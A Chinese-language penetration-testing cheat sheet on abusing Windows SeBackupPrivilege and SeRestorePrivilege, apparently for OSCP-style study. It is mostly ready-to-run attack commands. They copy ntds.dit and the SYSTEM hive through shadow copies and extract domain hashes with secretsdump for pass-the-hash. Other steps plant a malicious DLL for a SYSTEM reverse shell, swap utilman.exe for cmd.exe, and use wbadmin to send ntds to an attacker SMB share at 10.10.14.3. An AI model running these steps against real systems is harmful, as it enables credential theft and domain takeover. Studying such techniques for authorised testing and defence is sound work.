

# SeBackupPrivilege;SeRestorePrivilege

## 介绍

SeBackupPrivilege=允许用户进入备份模式->读取任意文件（忽略DACL/ACL权限检查和文件锁定），即使没读权限，也能复制敏感文件（如ntds.dit、SAM hive），默认持有者Backup Operators组成员。

SeRestorePrivilege=允许用户恢复模式写入任意文件（忽略DACL/覆盖系统文件），能替换系统二进制文件（如拿utilman.exe换cmd.exe拿system）、修改注册表，默认持有者也是Backup Operators组成员。

## 步骤

### 1）确认权限whoami /priv

### 2）主要利用：dump NTDS.dit（域hash）或SAM（本地hash）

（1）创建shadow copy绑定

（2）rebocopy /b 或DLL复制快照文件

（3）impacket-secretsdump提取hash->pth域管

## SeBackupPrivilege

### 1)dump ntds

（1）【vss.dsh】虚拟磁盘脚本

```
set context persistent nowriters
add volume c: alias df
create
expose %df% z:

编码转换：unix2dos vss.dsh 
```

（2）提取凭证

```
diskshadow /s c:\programdata\vss.dsh
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
Set-SeBackupPrivilege  # 启用权限（如果Disabled）
Copy-FileSeBackupPrivilege C:\Windows\NTDS\ntds.dit C:\temp\ntds.dit -Overwrite
reg save HKLM\SYSTEM C:\temp\system.hive
```

（3）导出凭证

```
secretsdump.py -system system -ntds ntds.dit LOCAL
```

### 2）dll劫持（需要SeRestore）

1）备份原dll（SeBackupPrivilege）：

```
robocopy /b C:\Windows\System32 C:\temp PrintNotify.dll
```

2）用SeRestore覆盖为恶意dll（用msfvenom生成）：

```
copy /y C:\temp\malicious.dll C:\Windows\System32\PrintNotify.dll
```

3）重启服务（或等待）：

```
sc stop Spooler
sc start Spooler
```

4）恶意dll加载 → 反弹shell as SYSTEM。

## SeRestorePrivilege

### 1）utilman.exe提权（Ease of Access绕过登录，拿SYSTEM）（OSCP最经典）

```
原理：Windows登录界面Win+U打开Ease of Access，调用C:\Windows\System32\utilman.exe。用SeRestore覆盖它为cmd.exe。
步骤：
备份原utilman.exe（用SeBackup或robocopy /b）：textrobocopy /b C:\Windows\System32 C:\temp utilman.exe
用SeRestore覆盖为cmd.exe：textcopy /y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe（SeRestore允许覆盖系统文件）。
锁屏（Win+L） → Win+U → 打开cmd.exe（SYSTEM权限）。
创建管理员或加用户到administrators组。
```

### 2）dll劫持提权

```
找高权限服务加载dll路径（writable），用SeRestore覆盖恶意dll → 服务启动加载 → code execution as SYSTEM。
```

### 3）服务二进制替换

```
替换可写服务exe为恶意payload（需SeRestore忽略ACL）。
```

### 4）结合SeBackupPrivilege读写任意文件

```
SeBackup读敏感文件 → 修改 → SeRestore写回（持久化或提权）。
```

## 什么是robocopy？

### 介绍

robocopy（Robust File Copy），这是windows内置的强大文件复制工具，比copy/xcopy强（支持镜像复制，重试，日志，多线程等，适合大文件/目录复制），结合（Backup mode），能忽略文件ACL权限（SeBackPrivilege启动时），复制任意文件（包括锁定ntds.dit）。

### 参数

| 参数     | 作用                                                         |
| -------- | ------------------------------------------------------------ |
| /b       | Backup mode，使用SeBackupPrivilege，SeRestorePrivilege忽略ACL复制文件（目录） |
| /mir     | 镜像目录（删除目标多余文件）                                 |
| /e       | 复制子目录                                                   |
| /zb      | 备份模式失败时切换重启模式                                   |
| /r:n/w:n | 重试次数和等待时间                                           |

### 备份模式复制

```
robocopy /b X:\Windows\NTDS C:\temp ntds.dit  # X:是shadow copy盘
```

## 什么是shadow copy dick？

### 介绍

shadow copy（Volume Shadow Copy）卷影副本，由VSS服务（Volume Shadow Copy Service）创建

本质是一个临时快照盘，复制卷（C:）在某一时刻的状态。

### 关键作用

绕过文件锁定（ntds.dit被ntds服务锁定无法直接复制），从快照盘复制未锁定的文件版本。

### 什么时候用快照盘？

场景：SeBackupPrivilege提权时，ntds.dit/SAM被锁定（运行中进程占用）

技巧：创建shadow copy->暴露成X:盘->从X:盘复制ntds.dit(快照版本未锁定)

命令:

```
diskshadow /s script.dsh  # 脚本expose %shadow% X:
robocopy /b X:\Windows\NTDS C:\temp ntds.dit
```

结果:复制成功->dump hash拿域管

## wbadmin

### 介绍

wbadmin是windows系统备份工具.

### linux监听smb

```
impacket-smbserver smb . -smb2support
```

### windows-wbadmin backup模式传输

```
echo "Y" | wbadmin start backup -backuptarget:\\10.10.14.3\smb -include:c:\windows\ntds
```

### 前提

当前用户有SeBackupPrivilege

### 流程

1)Kali监听SMB共享:impacket-smbserver smb . -smb2support

2)备份完后,ntds,dit出现的共享目录

3)需要SYSTEM hive(reg save HKLM\\SYSTEM system.hive下载)

4)dump hash:impacket-secretdump -ntds ntds.dit -system system.hive LOCAL

5)域管